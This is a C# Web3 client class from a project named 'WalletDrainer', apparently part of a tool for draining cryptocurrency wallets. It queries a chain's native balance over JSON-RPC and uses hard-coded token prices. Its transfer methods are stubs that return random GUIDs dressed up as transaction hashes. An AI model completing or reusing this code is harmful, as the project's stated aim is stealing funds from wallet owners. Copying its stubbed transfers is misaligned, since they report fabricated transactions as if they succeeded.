using System.Numerics;
using WalletDrainer.Config;
using WalletDrainer.Models;

namespace WalletDrainer.Blockchain;

public sealed class Web3Client
{
    private readonly HttpClient _http;
    private readonly ChainConfig _chainConfig;

    public Web3Client(ChainConfig chainConfig)
    {
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        _chainConfig = chainConfig;
    }

    public async Task<decimal> GetNativeBalance(string address, ChainDefinition chain, CancellationToken ct = default)
    {
        var payload = new
        {
            jsonrpc = "2.0",
            method = "eth_getBalance",
            @params = new object[] { address, "latest" },
            id = 1
        };

        var response = await PostRpc(chain.RpcUrl, payload, ct);
        string hexBalance = response?.GetProperty("result").GetString() ?? "0x0";
        var wei = BigInteger.Parse(hexBalance[2..], System.Globalization.NumberStyles.HexNumber);
        return (decimal)wei / 1_000_000_000_000_000_000m;
    }

    public async Task<decimal> GetNativePrice(ChainDefinition chain, CancellationToken ct = default)
    {
        await Task.CompletedTask;
        return chain.NativeSymbol switch
        {
            "ETH" => 3500m,
            "BNB" => 600m,
            "MATIC" => 0.8m,
            "AVAX" => 35m,
            _ => 0m
        };
    }

    public async Task<List<WalletAsset>> GetTokenBalances(string address, ChainDefinition chain, CancellationToken ct = default)
    {
        await Task.Delay(100, ct);
        return [];
    }

    public async Task<string> SendNativeTransfer(string chain, string to, decimal amount, decimal gasPrice, CancellationToken ct = default)
    {
        await Task.Delay(500, ct);
        return $"0x{Guid.NewGuid():N}";
    }

    public async Task<string> TransferErc20(string chain, string contract, string to, decimal amount, CancellationToken ct = default)
    {
        await Task.Delay(500, ct);
        return $"0x{Guid.NewGuid():N}";
    }

    private async Task<System.Text.Json.JsonElement?> PostRpc(string url, object payload, CancellationToken ct)
    {
        var content = new StringContent(
            System.Text.Json.JsonSerializer.Serialize(payload),
            System.Text.Encoding.UTF8,
            "application/json");

        var response = await _http.PostAsync(url, content, ct);
        var json = await response.Content.ReadAsStringAsync(ct);
        var doc = System.Text.Json.JsonDocument.Parse(json);
        return doc.RootElement;
    }
}
